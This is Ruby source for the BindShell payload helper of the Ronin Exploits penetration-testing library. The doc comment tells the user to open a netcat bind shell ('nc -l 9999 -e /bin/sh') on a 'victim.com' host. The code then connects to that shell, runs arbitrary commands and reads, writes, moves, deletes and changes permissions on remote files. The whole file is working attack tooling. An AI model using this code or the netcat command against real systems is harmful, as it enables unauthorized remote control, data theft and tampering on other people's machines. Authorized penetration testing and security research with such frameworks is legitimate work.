#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/extensions/string'

require 'socket'

module Ronin
  module Payloads
    module Helpers
      #
      # A {Payload} helper for communicating with TCP/UDP bind-shells.
      #
      # ## Example
      #
      #     ronin_payload do
      #
      #       helper :bind_shell
      #
      #       cache do
      #         # ...
      #       end
      #
      #     end
      #
      # ## Usage
      # 
      # On the remote host start the bind-shell. The easiest way is using
      # the `netcat` utility; assuming you can execute commands.
      #
      #     $ nc -l 9999 -e /bin/sh
      #
      # Configure the payload:
      # 
      #     payload.host = 'victim.com'
      #     payload.port = 9999
      #
      # Then access the bind-shell.
      #
      #     payload.shell.ls
      #     # => "Documents  Music\t   Public  Templates\nDesktop
      #     Downloads  Pictures  src\t   Videos\n"
      #
      module BindShell
        def self.extended(base)
          base.instance_eval do
            leverage :shell
            leverage :fs

            # The host the bind-shell is running on
            parameter :host, :type => String,
                             :description => 'Host to connect to'

            # The port the bind-shell is listening on
            parameter :port, :type => Integer,
                              :description => 'Port to connect to'

            # The protocol to use (tcp/udp)
            parameter :protocol, :default => :tcp,
                                 :description => 'Protocol to connect with'
          end
        end

        #
        # Determines if there is a connection with the bind-shell.
        #
        # @return [Boolean]
        #   Specifies whether there is an active connection with the
        #   bind-shell.
        #
        # @since 0.4.0
        #
        def shell_connected?
          (@shell_connection && !(@shell_connection.closed?))
        end

        #
        # Closes the bind-shell connection.
        #
        # @since 0.4.0
        #
        def shell_disconnect!
          @shell_connection.close if shell_connected?
          @shell_connection = nil
        end

        #
        # Send a command to the bind-shell and process the output.
        #
        # @param [String] program
        #   The program to run remotely.
        #
        # @param [Array<String>] program
        #   Additional arguments for the program.
        #
        # @yield [line]
        #   Each line of output received from the bind-shell will be
        #   yielded.
        #
        # @yieldparam [String] line
        #   A line of output from the shell.
        #
        # @since 0.4.0
        #
        def shell_exec(program,*arguments)
          command = ([program] + arguments).join(' ')
          
          # generate a random id for the command
          id = (rand(1_000_000) + 10_000_000).to_s
          header = "#{self.host}:#{self.port} [#{id}]"

          print_debug "#{header} Sending command: #{command}"

          # send the command
          shell_connection.puts("#{command}; echo #{id}")

          shell_connection.each_line do |line|
            # stop when we see the id being echoed
            break if line.rstrip == id

            print_debug "#{header}   #{line.dump}"
            yield line
          end

          print_debug "#{header} Command finished."
        end

        #
        # Writes data to the bind shell.
        #
        # @param [String] data
        #   The data to write.
        #
        # @return [Integer]
        #   The number of bytes writen.
        #
        # @since 0.4.0
        #
        def shell_write(data)
          shell_connection.write(data)
        end

        def fs_read(path,pos)
          shell.exec('dd',"if=#{path}",'bs=1',"skip=#{pos}",'count=4096')
        end

        def fs_write(path,pos,data)
          escaped = data.gsub('%','%%').dump

          shell.exec("printf #{escaped} | dd if=#{path} bs=1 skip=#{pos} count=4096")
        end

        def fs_copy(path,new_path)
          shell.cp(path,new_path).empty?
        end

        def fs_unlink(path)
          shell.rm(path).empty?
        end

        def fs_rmdir(path)
          shell.rmdir(path).empty?
        end

        def fs_move(path,new_path)
          shell.mv(path,new_path).empty?
        end

        def fs_chown(path,owner)
          shell.chown(owner,path).empty?
        end

        def fs_chgrp(path,group)
          shell.chgrp(group,path).empty?
        end

        def fs_chmod(path,mode)
          shell.chmod(mode,path).empty?
        end

        def fs_stat(path)
          fields = shell.exec('stat','-t',path).strip.split(' ')

          return {
            :path => path,
            :size => fields[1].to_i,
            :blocks => fields[2].to_i,
            :uid => fields[4].to_i,
            :gid => fields[5].to_i,
            :inode => fields[7].to_i,
            :links => fields[8].to_i,
            :atime => Time.at(fields[11].to_i),
            :mtime => Time.at(fields[12].to_i),
            :ctime => Time.at(fields[13].to_i),
            :blocksize => fields[14].to_i
          }
        end

        def sys_getuid
          shell.uid
        end

        def sys_getgid
          shell.gid
        end

        def sys_kill(pid)
          shell.kill(pid)
        end

        def sys_time
          shell.time
        end

        def sys_exit
          shell.exit
        end

        protected

        #
        # The socket class to use when connecting to the bind-shell.
        #
        # @return [Class]
        #   The socket class to use.
        #
        # @raise [RuntimeError]
        #   An unknown protocol was given for the bind-shell.
        #
        # @since 0.4.0
        #
        def shell_socket
          case self.protocol
          when :tcp
            TCPSocket
          when :udp
            UDPSocket
          else
            raise(RuntimeError,"unknown bind-shell protocol #{self.protocol}",caller)
          end
        end

        #
        # Transparently opens a connection to the bind-shell.
        #
        # @return [TCPSocket, UDPSocket]
        #   The bind-shell connection.
        #
        # @since 0.4.0
        #
        def shell_connection
          @shell_connection ||= shell_socket.new(self.host,self.port)
        end
      end
    end
  end
end
